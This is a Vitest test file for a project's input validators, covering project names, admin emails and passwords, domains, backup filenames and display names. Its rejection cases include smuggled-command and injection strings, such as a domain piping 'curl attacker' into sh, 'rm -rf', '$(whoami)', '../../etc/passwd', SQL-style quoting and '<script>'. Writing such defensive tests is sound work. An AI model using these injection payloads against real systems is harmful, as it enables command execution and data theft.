import { describe, expect, it } from 'vitest';
import {
  validateAdminEmail,
  validateAdminPassword,
  validateBackupFilename,
  validateDisplayName,
  validateDomain,
  validateProjectName,
} from '../../../src/lib/validators.js';

describe('validateProjectName', () => {
  it.each([['my-app'], ['app1'], ['a'], ['a1b2c3']])('accepts %s', (good) => {
    expect(validateProjectName(good)).toBeUndefined();
  });

  it.each([['foo/bar'], ['../evil'], ['/abs/path'], ['..'], ['.hidden']])(
    'rejects non-basename %s',
    (bad) => {
      expect(validateProjectName(bad)).toMatch(/basename/i);
    },
  );

  it.each([[''], ['-bad'], ['bad-'], ['MyApp'], ['foo bar'], ['foo_bar'], ['foo.bar'], ['1foo']])(
    'rejects invalid name %s',
    (bad) => {
      expect(validateProjectName(bad)).toBeTruthy();
    },
  );

  it('rejects reserved names case-insensitively', () => {
    expect(validateProjectName('node_modules')).toMatch(/reserved/i);
    expect(validateProjectName('Node_Modules')).toBeTruthy();
    expect(validateProjectName('.git')).toBeTruthy();
  });

  it('rejects names longer than 63 characters', () => {
    expect(validateProjectName('a'.repeat(64))).toMatch(/63/);
    expect(validateProjectName('a'.repeat(63))).toBeUndefined();
  });
});

describe('validateAdminEmail', () => {
  it.each([
    ['alice@example.com'],
    ['a.b+c@sub.domain.org'],
    ['name_with_underscore@x.co'],
    ['digits123@example.io'],
  ])('accepts %s', (good) => {
    expect(validateAdminEmail(good)).toBeUndefined();
  });

  it.each([
    [`evil'or'1=1@example.com`],
    [`bad"quote@example.com`],
    [`dollar$@example.com`],
    ['back`tick@example.com'],
    ['newline\n@example.com'],
    ['tab\t@example.com'],
  ])('rejects shell/SQL-unsafe %s', (bad) => {
    expect(validateAdminEmail(bad)).toBeTruthy();
  });

  it.each([['noatsign'], ['two@at@signs'], ['@leading'], ['trailing@'], ['no.tld@example'], ['']])(
    'rejects malformed %s',
    (bad) => {
      expect(validateAdminEmail(bad)).toBeTruthy();
    },
  );
});

describe('validateAdminPassword', () => {
  it.each([['Tr0ub4dour!'], ['safe-password'], ['8chars!!']])('accepts %s', (good) => {
    expect(validateAdminPassword(good)).toBeUndefined();
  });

  it('rejects short', () => {
    expect(validateAdminPassword('short')).toMatch(/8/);
  });

  it.each([["Tr0ub'dour"], [`Tr0ub"dour`], ['Tr0ub`dour'], ['Tr0ub$dour'], ['Tr0ub\\dour']])(
    'rejects shell metachar %s',
    (bad) => {
      expect(validateAdminPassword(bad)).toBeTruthy();
    },
  );

  it('rejects control characters', () => {
    expect(validateAdminPassword('Tr0ub\ndour')).toBeTruthy();
    expect(validateAdminPassword('Tr0ub\tdour')).toBeTruthy();
    expect(validateAdminPassword('Tr0ub\x00dour')).toBeTruthy();
  });

  it('rejects non-printable / non-ASCII', () => {
    expect(validateAdminPassword('Tr0ubédour')).toBeTruthy();
  });
});

describe('validateDomain', () => {
  it.each([['example.com'], ['app.example.co.uk'], ['a.b']])('accepts %s', (good) => {
    expect(validateDomain(good)).toBeUndefined();
  });

  it.each([
    ['evil"|curl attacker|sh'],
    ['evil.com;rm -rf'],
    ["evil'com"],
    ['a b.com'],
    ['.leading.dot'],
    ['trailing.dot.'],
    ['-dash.com'],
    ['dash-.com'],
    ['single-label'],
    [''],
  ])('rejects %s', (bad) => {
    expect(validateDomain(bad)).toBeTruthy();
  });

  it('rejects a 254-character domain but accepts 253', () => {
    // Build a 253-char domain using four valid labels (63+63+63+61, joined by dots)
    const at253 = `${'a'.repeat(63)}.${'a'.repeat(63)}.${'a'.repeat(63)}.${'a'.repeat(61)}`;
    expect(at253.length).toBe(253);
    expect(validateDomain(at253)).toBeUndefined();
    // Prepend 'a.' (2 chars) to tip it to 255 chars
    expect(validateDomain(`a.${at253}`)).toBeTruthy();
  });

  it('rejects a 64-character label but accepts 63', () => {
    expect(validateDomain(`${'a'.repeat(63)}.com`)).toBeUndefined();
    expect(validateDomain(`${'a'.repeat(64)}.com`)).toBeTruthy();
  });
});

describe('validateBackupFilename', () => {
  it.each([['vibecarbon-20260417-120000.tar.gz'], ['dump.sql.gz'], ['backup.tar'], ['dump.sql']])(
    'accepts %s',
    (good) => {
      expect(validateBackupFilename(good)).toBeUndefined();
    },
  );

  it.each([
    ['../../etc/passwd'],
    ['/abs/path.tar.gz'],
    ['foo/bar.tar.gz'],
    ['foo;rm.tar.gz'],
    ['foo$(whoami).tar.gz'],
    ['random.zip'],
    ['..tar.gz'],
    ['.env.tar.gz'],
    [''],
  ])('rejects %s', (bad) => {
    expect(validateBackupFilename(bad)).toBeTruthy();
  });
});

describe('validateDisplayName', () => {
  it.each([['My App'], ['Vibecarbon'], ['App 2.0'], ['my-app'], ['Foo_Bar'], ['A'], ['Web3 App']])(
    'accepts %s',
    (good) => {
      expect(validateDisplayName(good)).toBeUndefined();
    },
  );

  it.each([
    [''],
    [' Leading'],
    ['Trailing '],
    ["Bad'Quote"],
    ['Bad"Quote'],
    ['<script>'],
    ['Foo & Bar'],
    ['Back\\slash'],
    ['Curly{Brace}'],
    ['New\nline'],
    ['Café'],
    ['-starts-with-hyphen'],
  ])('rejects %j', (bad) => {
    expect(validateDisplayName(bad)).toBeTruthy();
  });

  it('rejects names longer than 64 characters', () => {
    expect(validateDisplayName('a'.repeat(65))).toMatch(/64/);
    expect(validateDisplayName('a'.repeat(64))).toBeUndefined();
  });
});
